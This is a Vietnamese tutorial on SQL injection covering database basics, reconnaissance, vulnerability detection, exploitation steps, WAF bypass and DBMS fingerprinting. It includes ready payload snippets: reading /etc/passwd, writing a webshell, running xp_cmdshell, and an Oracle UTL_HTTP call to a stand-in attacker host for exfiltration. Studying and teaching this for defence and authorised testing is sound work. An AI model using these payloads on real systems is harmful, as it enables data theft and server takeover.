# Toàn tập về SQL Injection: Từ Lý thuyết đến Thực chiến

Tài liệu này cung cấp một cái nhìn tổng quan và chi tiết về lỗ hổng SQL Injection, bắt đầu từ những khái niệm nền tảng nhất cho đến quy trình tấn công và khai thác trong thực tế.

## Mục lục
1.  [Phần 1: Các Khái niệm Nền tảng](#phần-1-các-khái-niệm-nền-tảng)
    *   [Database là gì & Tại sao lại được sử dụng?](#database-là-gì--tại-sao-lại-được-sử-dụng)
    *   [Các thành phần chính của một hệ thống Database](#các-thành-phần-chính-của-một-hệ-thống-database)
    *   [Các loại Database phổ biến](#các-loại-database-phổ-biến-hiện-nay)
    *   [Dữ liệu được lưu trữ có giá trị gì?](#dữ-liệu-được-lưu-trữ-có-giá-trị-gì)
2.  [Phần 2: Tương tác với Database & Góc nhìn của Hacker](#phần-2-tương-tác-với-database--góc-nhìn-của-hacker)
    *   [Công cụ chính: SQL (Structured Query Language)](#công-cụ-chính-sql-structured-query-language)
    *   [SQL trong tay kẻ tấn công](#sql-trong-tay-kẻ-tấn-công)
    *   [Hệ quản trị: DBMS (Database Management System)](#hệ-quản-trị-dbms-database-management-system)
3.  [Phần 3: Quy trình Kiểm thử & Tấn công Thực tế](#phần-3-quy-trình-kiểm-thử--tấn-công-thực-tế)
    *   [Giai đoạn 1 & 2: Trinh sát và Sàng lọc](#giai-đoạn-1--2-trinh-sát-lập-bản-đồ-và-sàng-lọc-mục-tiêu)
    *   [Giai đoạn 3 & 4: Khoanh vùng Vector Tấn công](#giai-đoạn-3--4-khoanh-vùng-vector-tấn-công-trên-một-mục-tiêu)
    *   [Giai đoạn 5: Phân biệt "Bất khả thi" và "Bị chặn"](#giai-đoạn-5-phân-biệt-bất-khả-thi-và-bị-chặn)
    *   [Giai đoạn 6: Lựa chọn kỹ thuật và Khai thác](#giai-đoạn-6-lựa-chọn-kỹ-thuật-và-khai-thác)
4.  [Phần 4: Phân tích Phản hồi & Đánh giá Khả năng Khai thác](#phần-4-phân-tích-phản-hồi--đánh-giá-khả-năng-khai-thác)
    *   [Nhận diện sự tồn tại của lỗ hổng](#nhận-diện-sự-tồn-tại-của-lỗ-hổng-3-trạng-thái-phản-hồi-cơ-bản)
    *   [Phân tích khi bị chặn: WAF hay Input Sanitization?](#phân-tích-khi-bị-chặn-waf-hay-input-sanitization)
    *   [Đánh giá khả năng khai thác: Từ "có lỗ hổng" đến "có thể làm gì?"](#đánh-giá-khả-năng-khai-thác-từ-có-lỗ-hổng-đến-có-thể-làm-gì)
5.  [Phần 5: Ma trận & Kỹ thuật Nâng cao](#phần-5-ma-trận--kỹ-thuật-nâng-cao)
    *   [Ma trận Nhận diện & Phản hồi](#ma-trận-nhận-diện--phản-hồi-detection--response)
    *   [Ma trận Bypass & Kỹ thuật theo DBMS](#ma-trận-bypass--kỹ-thuật-theo-dbms)
    *   [Quy trình ra quyết định: "Tiếp tục hay bỏ cuộc?"](#quy-trình-ra-quyết-định-tiếp-tục-hay-bỏ-cuộc)

---

## Phần 1: Các Khái niệm Nền tảng

Để hiểu về SQL Injection, trước hết ta phải hiểu database là gì? Tại sao nó lại được sử dụng? Nó lưu trữ những gì, và những thứ đó có giá trị gì?

### Database là gì & Tại sao lại được sử dụng?

> **Database** là một tập hợp các dữ liệu được tổ chức và sắp xếp sao cho ta có thể dễ dàng truy cập, quản lý và cập nhật.

**Tại sao không dùng Excel mà phải dùng Database?**
*   **Khả năng lưu trữ khổng lồ:** Xử lý hàng triệu, hàng tỷ dòng dữ liệu mà không bị "treo".
*   **Đa người dùng:** Nhiều người có thể đọc và ghi dữ liệu cùng một lúc mà không gây xung đột.
*   **Bảo mật:** Phân quyền chi tiết ai được xem cái gì, ai được sửa cái gì.
*   **Mối quan hệ:** Liên kết các bảng dữ liệu với nhau (ví dụ: liên kết bảng "Khách hàng" với bảng "Đơn hàng").

### Các thành phần chính của một hệ thống Database

Để một Database hoạt động, chúng ta thường cần 3 yếu tố:
1.  **Data (Dữ liệu):** Thông tin thô (tên, số điện thoại, ngày sinh...).
2.  **DBMS (Hệ quản trị cơ sở dữ liệu):** Phần mềm dùng để tương tác với Database (như MySQL, PostgreSQL, Oracle). Hãy coi đây là "người quản kho".
3.  **Database Schema:** Cấu trúc hoặc thiết kế của dữ liệu.

### Các loại Database phổ biến hiện nay

Tùy vào mục đích sử dụng, người ta chia thành hai "phe" chính:

| Loại | Đặc điểm | Ví dụ |
| :--- | :--- | :--- |
| **Relation (SQL)** | Dữ liệu được tổ chức thành các bảng có hàng và cột rõ ràng. Rất chặt chẽ. | MySQL, SQL Server, PostgreSQL |
| **Non-relational (NoSQL)** | Dữ liệu linh hoạt, dạng tài liệu hoặc cặp khóa-giá trị. Phù hợp cho dữ liệu lớn, biến động. | MongoDB, Redis, Cassandra |

### Dữ liệu được lưu trữ có giá trị gì?

Database không chỉ là con số, nó lưu trữ mọi thứ định nghĩa nên một thực thể số.

*   **Dữ liệu định danh (Identity Data):** Họ tên, ngày sinh, số CCCD/Passport, địa chỉ nhà, và quan trọng nhất là Username/Password (thường ở dạng mã hóa hash).
*   **Dữ liệu liên lạc (Contact Data):** Email, số điện thoại, danh sách bạn bè hoặc danh bạ.
*   **Dữ liệu tài chính (Financial Data):** Số thẻ tín dụng (thường là 4 số cuối hoặc token), số dư ví, lịch sử giao dịch, mã số thuế.
*   **Dữ liệu hành vi (Behavioral Data):** Bạn đã xem sản phẩm nào, bạn thích bài viết nào, bạn thường đăng nhập lúc mấy giờ, vị trí GPS của bạn.
*   **Dữ liệu nội dung (Content Data):** Các tin nhắn riêng tư (Inbox), các bài viết nháp chưa công khai, hoặc file đính kèm bảo mật.

> **Đối với trang web/hệ thống:** Mỗi loại dữ liệu là một bánh răng không thể thiếu trong cỗ máy vận hành.
> **Đối với Hacker:** Dữ liệu không chỉ để bán. Nó là chìa khóa để đi sâu hơn, ở lại lâu hơn và phá hoại nhiều hơn.

---

## Phần 2: Tương tác với Database & Góc nhìn của Hacker

Làm sao để ta có thể tương tác với những dữ liệu đó? Chúng ta cần một "ngôn ngữ giao tiếp" (SQL) và một "phần mềm quản lý" (DBMS).

### Công cụ chính: SQL (Structured Query Language)

> **SQL** là ngôn ngữ tiêu chuẩn để nói chuyện với các Database quan hệ. Hãy coi SQL như một "vị thần đèn", bạn đưa ra câu lệnh đúng cú pháp, vị thần sẽ thực hiện chính xác yêu cầu đó.

SQL có thể làm các hoạt động **CRUD**:
*   **C (Create):** Tạo mới dữ liệu (ví dụ: Đăng ký một tài khoản mới).
*   **R (Read/Retrieve):** Đọc dữ liệu (ví dụ: Xem danh sách bạn bè, xem số dư tài khoản).
*   **U (Update):** Cập nhật dữ liệu (ví dụ: Thay đổi mật khẩu, đổi tên hiển thị).
*   **D (Delete):** Xóa dữ liệu (ví dụ: Xóa một bài viết, hủy một đơn hàng).

Ngoài ra, SQL còn có thể tính toán, sắp xếp và lọc dữ liệu cực nhanh.

### SQL trong tay kẻ tấn công

Tùy thuộc vào loại DBMS và cấu hình, một câu lệnh SQL có thể thực hiện các hành động cực kỳ nguy hiểm:
*   **Đọc/Ghi file trên hệ thống (File I/O):** Đọc các file nhạy cảm (`/etc/passwd`, file config) hoặc ghi một webshell lên server.
*   **Thực thi lệnh hệ điều hành (Command Execution):** Trực tiếp thực thi các lệnh shell, cho phép kẻ tấn công chiếm toàn quyền kiểm soát máy chủ database.
*   **Tạo kết nối mạng ra bên ngoài (Network Requests):** Gửi dữ liệu đã trích xuất ra một máy chủ do hacker kiểm soát (Out-of-Band Exfiltration).
*   **Thao tác với quyền hạn (Privilege Manipulation):** Tự cấp cho tài khoản database hiện tại những quyền hạn cao hơn.

### Hệ quản trị: DBMS (Database Management System)

Nếu SQL là ngôn ngữ, thì DBMS là cái "tổng đài" tiếp nhận ngôn ngữ đó.

*   **Nó là gì?** Là phần mềm trung gian nằm giữa người dùng (hoặc ứng dụng) và dữ liệu thực tế được lưu trên ổ cứng.
*   **Nhiệm vụ:** Đảm bảo an toàn, quản lý quyền truy cập, sao lưu dữ liệu và thực thi các câu lệnh SQL một cách tối ưu nhất.
*   **Các DBMS phổ biến:** MySQL, Microsoft SQL Server (MSSQL), PostgreSQL, Oracle.

**"Vũ khí" riêng của mỗi DBMS mà hacker có thể khai thác:**

*   **MySQL/MariaDB:**
    *   **Đọc file:** `LOAD_FILE('/etc/passwd')` (Yêu cầu quyền `FILE`).
    *   **Ghi file:** `SELECT 'shell_code' INTO OUTFILE '/var/www/shell.php'` (Yêu cầu quyền `FILE`).
*   **Microsoft SQL Server (MSSQL):**
    *   **Thực thi lệnh:** `EXEC xp_cmdshell 'whoami'` (Cần quyền admin để kích hoạt).
    *   **Stacked Queries:** Hỗ trợ dùng dấu `;` để "chồng" nhiều lệnh, cực kỳ mạnh mẽ.
*   **PostgreSQL:**
    *   **Thực thi lệnh:** Tạo hàm UDF bằng ngôn ngữ C (kỹ thuật nâng cao).
    *   **Đọc/Ghi file:** Thông qua large objects hoặc hàm `COPY FROM`/`COPY TO` (cần quyền superuser).
*   **Oracle:**
    *   **Thực thi lệnh:** Tạo thư viện Java hoặc PL/SQL.
    *   **Gửi request mạng:** `UTL_HTTP.REQUEST('http://attacker.com')` (Hữu ích cho Blind/OOB).

---

## Phần 3: Quy trình Kiểm thử & Tấn công Thực tế

Một cuộc tấn công hoặc kiểm thử thực tế sẽ diễn ra như thế nào?

### Giai đoạn 1 & 2: Trinh sát, Lập bản đồ và Sàng lọc Mục tiêu

> Đây là giai đoạn nền tảng, quyết định 80% thành công của một cuộc tấn công. Mục tiêu là không bỏ sót bất kỳ lối vào nào.

1.  **Mở rộng bề mặt tấn công:**
    *   **Subdomain Enumeration:** Dùng `subfinder`, `amass` để tìm tất cả subdomain. Các subdomain "bị lãng quên" thường là mục tiêu yếu nhất.
    *   **Endpoint & Directory Discovery:** Dùng `dirsearch`, `gobuster` với wordlist lớn để "brute-force" các đường dẫn và endpoint.
    *   **Phân tích JS Files:** Dùng `LinkFinder`, `JSParser` để trích xuất các endpoint API ẩn, API Key từ các file JavaScript.
    *   **Tìm URL lịch sử:** Dùng `Waybackurls`/`Gauge` để tìm các URL đã từng tồn tại nhưng nay bị ẩn.
2.  **Sàng lọc và phân loại ban đầu:**
    *   Tự động phân loại danh sách URL khổng lồ dựa trên HTTP status code:
        *   `2xx (Success)`: Mục tiêu chính cần phân tích.
        *   `3xx (Redirection)`: Kiểm tra xem chuyển hướng đi đâu.
        *   `403 (Forbidden)`: Mục tiêu tiềm năng nếu có thể bypass phân quyền.
        *   `5xx (Server Error)`: **Mỏ vàng!** Lỗi server cho thấy ứng dụng đang xử lý sai, rất có khả năng tồn tại SQLi, SSTI...

### Giai đoạn 3 & 4: Khoanh vùng Vector Tấn công trên một Mục tiêu

Khi đã chọn được một endpoint cụ thể (ví dụ: `https://api.example.com/v1/products?id=123`), đây là lúc "soi kính lúp".

1.  **Xác định chức năng có khả năng cao có lỗi:**
    *   **Truy vấn và lọc (Data Retrieval):** Tìm kiếm (`Search`), lọc (`Filter`), sắp xếp (`Sort`). Nơi dùng `WHERE` hoặc `ORDER BY`.
    *   **Định danh (Identification):** Xem hồ sơ (`/user/profile?id=123`), xem bài viết. Nơi dữ liệu đầu vào thường được đưa thẳng vào `SELECT`.
    *   **Ghi dữ liệu (Data Modification):** Đăng ký, cập nhật thông tin. Nơi có thể khai thác `INSERT-based SQLi`.
2.  **Xác định các điểm vào (Entry Points):**
    *   **Hiển nhiên:**
        *   `GET Parameters`: `id=123` trong URL.
        *   `POST Body`: Dữ liệu trong các form (JSON, XML, form-data).
    *   **Ít hiển nhiên hơn (thường được bảo vệ kém hơn):**
        *   `HTTP Headers`: `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`.
        *   `Path Segments`: Trong API RESTful, số `123` trong `/users/123/orders`.
3.  **Khám phá tham số ẩn:**
    *   Dùng `Arjun` hoặc `x8` để tìm các tham số ẩn như `?debug=true`, `?admin=1`. Một tham số "thần thánh" do dev để lại có thể mở toang cánh cửa SQLi.
4.  **Kiểm thử trước và sau khi đăng nhập:**
    *   Luôn kiểm thử mọi chức năng trước khi đăng nhập.
    *   Sau đó, đăng nhập và lặp lại. Việc đăng nhập mở ra một bề mặt tấn công mới, thường được tin tưởng và kiểm tra lỏng lẻo hơn.

### Giai đoạn 5: Phân biệt "Bất khả thi" và "Bị chặn"

Đây là kỹ năng quan trọng nhất để không lãng phí thời gian.

1.  **Bước 1 - Payload thăm dò:** Gửi một payload đơn giản nhất, ví dụ, chỉ một dấu nháy đơn `'`.
2.  **Bước 2 - Phân tích phản hồi:**
    *   **Phản hồi A (Lỗi WAF/403 Forbidden):** Bị chặn bởi WAF. Nhiệm vụ là nhận diện WAF và tìm kỹ thuật bypass (thay đổi case, encoding, comments...).
    *   **Phản hồi B (Lỗi SQL/500 Server Error):** **Lỗ hổng đã được xác nhận!** Chuyển sang giai đoạn khai thác.
    *   **Phản hồi C (Trang tải lại bình thường):** Đây là trường hợp khó nhất. Có 3 khả năng:
        1.  **Bất khả thi:** Tham số không được dùng trong truy vấn SQL.
        2.  **Có thể khai thác (Blind):** Lỗ hổng tồn tại nhưng không hiển thị lỗi.
        3.  **Bị chặn âm thầm:** WAF/code đã lọc (sanitize) ký tự `'`.
3.  **Làm rõ trường hợp C:**
    *   **Thử payload logic:** `id=1 AND 1=1` (true) và `id=1 AND 1=2` (false). Nếu nội dung trang khác biệt -> **Xác nhận Blind SQLi**.
    *   **Thử payload thời gian:** `id=1 AND SLEEP(5)`. Nếu trang phản hồi chậm 5 giây -> **Xác nhận Time-based Blind SQLi**.
    *   Nếu tất cả đều không hiệu quả, khả năng cao là điểm vào này an toàn.

### Giai đoạn 6: Lựa chọn kỹ thuật và Khai thác

Khi đã xác nhận có lỗ hổng, ta chọn kỹ thuật dựa trên các dấu hiệu đã thu thập:

*   **Có lỗi SQL chi tiết?** -> Dùng **Error-Based** hoặc **UNION-Based**. Nhanh nhất để dump dữ liệu.
*   **Chỉ phân biệt được Đúng/Sai?** -> Dùng **Boolean-Based Blind**. Cần script/sqlmap để tự động hóa.
*   **Chỉ phân biệt được độ trễ?** -> Dùng **Time-Based Blind**. Chậm nhất nhưng đôi khi là cách duy nhất.
*   **Nghi ngờ có thể tạo kết nối ra ngoài?** -> Dùng **Out-of-Band (OOB)**. Sử dụng hàm CSDL để gửi dữ liệu ra máy chủ DNS/HTTP của bạn.

**Quá trình khai thác (Enumeration) tuần tự:**
1.  Lấy thông tin cơ bản: `version()`, `user()`, `database()`.
2.  Liệt kê các database: Đọc từ `information_schema` (MySQL/PostgreSQL) hoặc bảng hệ thống tương ứng.
3.  Chọn database mục tiêu và liệt kê các bảng.
4.  Chọn bảng mục tiêu và liệt kê các cột.
5.  Dump dữ liệu từ các cột đã chọn.
6.  Song song đó, kiểm tra quyền hạn của user (`FILE`, `xp_cmdshell`...) để xác định có thể leo thang tấn công (đọc file, RCE) hay không.

---

## Phần 4: Phân tích Phản hồi & Đánh giá Khả năng Khai thác

### Nhận diện sự tồn tại của lỗ hổng: 3 Trạng thái Phản hồi Cơ bản

1.  **Trạng thái A: Phản hồi Lỗi (Error Response)**
    *   **Dấu hiệu:** Lỗi `500 Internal Server Error`, thông báo lỗi SQL chi tiết (`"You have an error in your SQL syntax..."`).
    *   **Suy luận:** Gần như 99% có lỗ hổng.
    *   **Hành động:** Chuyển sang khai thác. Bắt đầu với `Error-based` injection.
2.  **Trạng thái B: Phản hồi bị Chặn (Blocked Response)**
    *   **Dấu hiệu:** Lỗi `403 Forbidden`, trang thông báo của WAF (Cloudflare, Akamai...).
    *   **Suy luận:** Có một lớp phòng thủ chủ động (WAF).
    *   **Hành động:** Nhận diện và vượt qua WAF. Đây là một trò chơi "mèo vờn chuột".
3.  **Trạng thái C: Phản hồi Im lặng (Silent Response)**
    *   **Dấu hiệu:** Trang tải lại bình thường, không lỗi, không bị chặn.
    *   **Suy luận:** Trường hợp phức tạp nhất. Có thể an toàn, bị lọc âm thầm, hoặc là Blind SQLi.
    *   **Hành động:** Dùng các kỹ thuật Blind để phân biệt 3 khả năng.

### Phân tích khi bị chặn: WAF hay Input Sanitization?

*   **Làm sao để nhận diện WAF?**
    *   Trang lỗi có thương hiệu (Cloudflare, Akamai...).
    *   Response Headers có `Server: cloudflare`.
    *   Chặn các payload rất cơ bản như `' OR 1=1 --`.
*   **Làm sao để nhận diện Input Sanitization?**
    *   Phản hồi `200 OK` nhưng payload bị thay đổi. Gửi `' OR 1=1 --` và xem mã nguồn, thấy nó chỉ còn `OR 1=1 --` (mất dấu nháy).
    *   Thử một chuỗi ký tự đặc biệt và xem ký tự nào bị "ăn mất".

### Đánh giá khả năng khai thác: Từ "có lỗ hổng" đến "có thể làm gì?"

Việc này phụ thuộc vào quyền hạn của user database.

*   **Bước 1: Lấy thông tin cơ bản:**
    *   `user()` hoặc `current_user`: User là `root`, `dbo`, `sa`? Hay chỉ là `webapp_user` bị giới hạn?
    *   `version()`: Biết phiên bản CSDL để tra cứu các tính năng/lỗ hổng đặc thù.
*   **Bước 2: Kiểm tra quyền hạn cụ thể:**
    *   **Quyền đọc file:** `SELECT LOAD_FILE('/etc/passwd')` (MySQL).
    *   **Quyền ghi file:** `SELECT 'test' INTO OUTFILE '/tmp/test.txt'` (MySQL).
    *   **Quyền thực thi lệnh (RCE):** `EXEC sp_configure 'xp_cmdshell'` (MSSQL).
*   **Ra quyết định dựa trên kết quả:**
    *   **Kịch bản 1: Quyền hạn cao (root, dbo, sa):** Gần như toàn năng. Mục tiêu là RCE, ghi webshell, dump toàn bộ CSDL.
    *   **Kịch bản 2: Quyền hạn trung bình (có quyền FILE):** Tác động vẫn rất cao. Ưu tiên đọc file config để tìm mật khẩu, sau đó thử ghi webshell để có RCE.
    *   **Kịch bản 3: Quyền hạn thấp (chỉ đọc/ghi trên database):** Tác động bị giới hạn ở việc trích xuất dữ liệu (Data Exfiltration). Rò rỉ dữ liệu người dùng (tên, email, password hash) vẫn là một lỗ hổng nghiêm trọng. Nhiệm vụ là dump hết dữ liệu có thể và báo cáo.

---

## Phần 5: Ma trận & Kỹ thuật Nâng cao

### Ma trận Nhận diện & Phản hồi (Detection & Response)

| Phản hồi của Server | Đặc điểm nhận dạng | Kết luận | Hành động tiếp theo |
| :--- | :--- | :--- | :--- |
| **403 Forbidden / 406 Not Acceptable** | Xuất hiện ngay khi nhập `'`, `UNION`, `SELECT`. Thường đi kèm giao diện của Cloudflare, FortiGate... | **WAF chặn cứng** | Thử Bypass bằng Encoding, Bypass Case, hoặc Comment Junk. |
| **200 OK (nhưng mất dữ liệu)** | Nhập `'` thì trang web trắng trơn hoặc mất một phần nội dung so với lúc bình thường. | **SQL Error ẩn** | Thử `' OR '1'='1`. Nếu dữ liệu quay lại -> Boolean-based SQLi. |
| **200 OK (dữ liệu không đổi)** | Nhập bất kỳ ký tự lạ nào trang web vẫn y hệt. | **Sanitization / Prepared Statements** | Thử Time-based (`sleep`). Nếu không trễ -> Khả năng cao là an toàn (Bỏ qua). |
| **500 Internal Server Error** | Xuất hiện khi nhập `'`, nhưng hết lỗi khi nhập `'` hoặc `-- -`. | **SQL Syntax Error** | Xác định DBMS và bắt đầu khai thác Error-based. |

### Ma trận Bypass & Kỹ thuật theo DBMS

*   **Nhóm bypass bộ lọc từ khóa (WAF Bypass):**
    *   **MySQL:** Dùng comment `/*!SELECT*/`, `/*!50000SELECT*/`. Dùng khoảng trắng thay thế: `SELECT/**/password/**/FROM/**/users`.
    *   **PostgreSQL:** Dùng toán tử nối chuỗi: `'SEL' || 'ECT'`. Dùng dấu trích dẫn kép: `"table_name"`.
    *   **MSSQL:** Dùng hằng số Hex: `0x53454c454354` (SELECT).
*   **Nhóm xác định DBMS (Fingerprinting):**
    
| DBMS | Câu lệnh kiểm tra (True) | Câu lệnh kiểm tra (False) | Đặc điểm nhận dạng |
| :--- | :--- | :--- | :--- |
| **MySQL** | `SELECT 1 FROM dual` | - | `@@version` chứa "MySQL" hoặc "MariaDB". |
| **PostgreSQL**| `SELECT 1 WHERE 1=1` | `SELECT 1 WHERE 1=2` | Có hàm `current_setting()`, `pg_sleep()`. |
| **MSSQL** | `SELECT 1 WHERE 1=1` | - | `@@version` chứa "Microsoft SQL Server". |
| **Oracle** | `SELECT 1 FROM v$version` | - | Bắt buộc phải có `FROM DUAL`. |

### Quy trình ra quyết định: "Tiếp tục hay bỏ cuộc?"

Để tối ưu hóa thời gian, bạn có thể sơ đồ hóa tư duy như sau:
1.  **Giai đoạn Fuzzing nhẹ:** Thử các ký tự gây lỗi cơ bản (`'`, `"`, `\`, `)`, `;`).
2.  **Giai đoạn Phân tích Phản hồi:**
    *   Nếu Server phản hồi khác biệt rõ rệt giữa True và False (`id=1 AND 1=1` vs `id=1 AND 1=2`) -> **Xác nhận có lỗ hổng**.
    *   Nếu Server trả về lỗi 500 nhưng không thể làm nó hết lỗi bằng comment -> **Lỗi Logic (Bỏ qua)**.
3.  **Giai đoạn leo thang:**
    *   Nếu có WAF mạnh và đã thử 3-4 kỹ thuật bypass phổ biến mà vẫn bị `403` -> **Tạm thời đánh dấu để quay lại sau (Thấp ưu tiên)**.
    *   Nếu tìm thấy một tham số trong Cookie hoặc Header không bị WAF kiểm soát -> **Tập trung khai thác ngay**.
